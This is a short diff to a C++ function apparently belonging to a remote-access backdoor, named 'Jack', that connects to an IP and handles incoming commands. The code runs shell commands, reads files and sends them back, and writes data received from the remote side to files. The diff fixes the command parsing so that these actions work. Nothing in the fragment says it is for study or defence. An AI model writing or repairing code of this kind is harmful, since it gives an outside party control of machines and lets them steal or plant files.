@@ -24,18 +24,17 @@ void Jack::execute(const std::string& ip)
 		const std::string download_command = "download";
 		const std::string upload_command = "upload";
 		std::cout << "command is " << request << std::endl;
-		if (request.find_first_of(run_command) == 0) {
+		std::cout << request.find_first_of(run_command) << std::endl;
+		if (request.find(run_command) == 0) {
 			response = run_shell(request.substr(run_command.length() + 1));
 			std::cout << "run shell"<< std::endl;
 		}
-		else if (request.find_first_of(download_command) == 0) {
-			File f(request.substr(download_command.length() + 1, request.find_first_of(' ', download_command.length() + 1) - 1));
+		else if (request.find(download_command) == 0) {
+			File f(request.substr(download_command.length() + 1));
 			response = f.read_whole_file();
 		}
-		else if (request.find_first_of(upload_command) == 0) {
-			File f(request.substr(upload_command.length() + 1, request.find_first_of(' ', upload_command.length() + 1) - 1));
-			std::cout << "write to" << request.substr(upload_command.length() + 1, request.find_first_of(' ', upload_command.length() + 1) - 1) << std::endl;
-			std::cout << "data " << request.substr(request.find_first_of(' ', upload_command.length() + 1) + 1) << std::endl;
+		else if (request.find(upload_command) == 0) {
+			File f(request.substr(upload_command.length() + 1, request.find_first_of(' ', upload_command.length() + 1) - 1 - upload_command.length()));
 			f.write_data(request.substr(request.find_first_of(' ', upload_command.length() + 1) + 1));
 			response = "Done";
 		}
